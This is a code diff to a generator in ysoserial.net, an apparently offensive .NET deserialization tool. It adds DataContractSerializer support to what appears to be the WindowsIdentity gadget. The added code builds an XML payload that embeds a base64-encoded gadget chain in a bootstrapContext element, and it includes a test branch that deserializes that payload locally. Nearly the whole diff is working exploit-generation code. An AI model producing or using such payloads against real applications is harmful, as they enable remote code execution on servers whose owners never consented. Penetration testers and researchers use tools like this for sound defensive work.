@@ -1,5 +1,8 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.IO;
+using System.Runtime.Serialization;
+using System.Xml;
 using Newtonsoft.Json;
 
 namespace ysoserial.Generators
@@ -27,7 +30,7 @@ namespace ysoserial.Generators
 
         public override List<string> SupportedFormatters()
         {
-            return new List<string> { "Json.Net" };
+            return new List<string> { "Json.Net", "DataContractSerializer" };
         }
 
         public override string Name()
@@ -55,7 +58,32 @@ namespace ysoserial.Generators
                         Object obj = JsonConvert.DeserializeObject<Object>(payload, new JsonSerializerSettings
                         {
                             TypeNameHandling = TypeNameHandling.Auto
-                        }); ;
+                        });
+                    }
+                    catch
+                    {
+                    }
+                }
+                return payload;
+            }
+            else if (formatter.ToLower().Equals("datacontractserializer"))
+            {
+                string payload = $@"<root xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" type=""System.Security.Principal.WindowsIdentity, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"">
+    <WindowsIdentity xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:x=""http://www.w3.org/2001/XMLSchema"" xmlns=""http://schemas.datacontract.org/2004/07/System.Security.Principal"">
+      <System.Security.ClaimsIdentity.bootstrapContext i:type=""x:string"" xmlns="""">{b64encoded}</System.Security.ClaimsIdentity.bootstrapContext>
+       </WindowsIdentity>
+</root>
+";
+
+                if (test)
+                {
+                    try
+                    {
+                        var xmlDoc = new XmlDocument();
+                        xmlDoc.LoadXml(payload);
+                        XmlElement xmlItem = (XmlElement)xmlDoc.SelectSingleNode("root");
+                        var s = new DataContractSerializer(Type.GetType(xmlItem.GetAttribute("type")));
+                        var d = s.ReadObject(new XmlTextReader(new StringReader(xmlItem.InnerXml)));
                     }
                     catch
                     {
